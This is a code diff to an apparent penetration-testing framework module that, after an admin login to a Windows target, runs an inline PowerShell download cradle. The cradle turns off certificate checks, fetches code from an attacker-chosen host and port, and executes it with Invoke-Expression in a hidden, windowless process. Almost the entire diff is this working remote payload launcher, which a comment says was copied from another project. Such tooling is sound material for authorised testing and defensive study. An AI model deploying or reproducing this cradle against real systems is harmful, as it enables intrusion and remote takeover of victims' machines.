@@ -33,23 +33,24 @@ class CMEModule:
         self.srvport = module_options['SRVPORT']
         self.rand = module_options['RAND']
 
-        self.ps_script = obfs_ps_script('Invoke-MetasploitPayload/Invoke-MetasploitPayload.ps1')
-
     def on_admin_login(self, context, connection):
-        payload = """Invoke-MetasploitPayload {}://{}:{}/{}""".format('http' if self.met_ssl == 'http' else 'https',
-                                                            self.srvhost,
-                                                            self.srvport,
-                                                            self.rand)
-        launcher = gen_ps_iex_cradle(context, 'Invoke-MetasploitPayload.ps1', payload, post_back=False)
-        connection.ps_execute(launcher, force_ps32=True)
+        # stolen from https://github.com/jaredhaight/Invoke-MetasploitPayload
+        command = """$url="{}://{}:{}/{}"
+        $DownloadCradle ='[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}};$client = New-Object Net.WebClient;$client.Proxy=[Net.WebRequest]::GetSystemWebProxy();$client.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;Invoke-Expression $client.downloadstring('''+$url+'''");'
+        $PowershellExe=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\powershell.exe'
+        if([Environment]::Is64BitProcess) {{ $PowershellExe='powershell.exe'}}
+        $ProcessInfo = New-Object System.Diagnostics.ProcessStartInfo
+        $ProcessInfo.FileName=$PowershellExe
+        $ProcessInfo.Arguments="-nop -c $DownloadCradle"
+        $ProcessInfo.UseShellExecute = $False
+        $ProcessInfo.RedirectStandardOutput = $True
+        $ProcessInfo.CreateNoWindow = $True
+        $ProcessInfo.WindowStyle = "Hidden"
+        $Process = [System.Diagnostics.Process]::Start($ProcessInfo)""".format(
+                'http' if self.met_ssl == 'http' else 'https', 
+                self.srvhost, 
+                self.srvport, 
+                self.rand)
+        context.log.debug(command)
+        connection.ps_execute(command, force_ps32=True)
         context.log.success('Executed payload')
-
-    def on_request(self, context, request):
-        if 'Invoke-MetasploitPayload.ps1' == request.path[1:]:
-            request.send_response(200)
-            request.end_headers()
-            request.wfile.write(self.ps_script.encode())
-            request.stop_tracking_host()
-        else:
-            request.send_response(404)
-            request.end_headers()
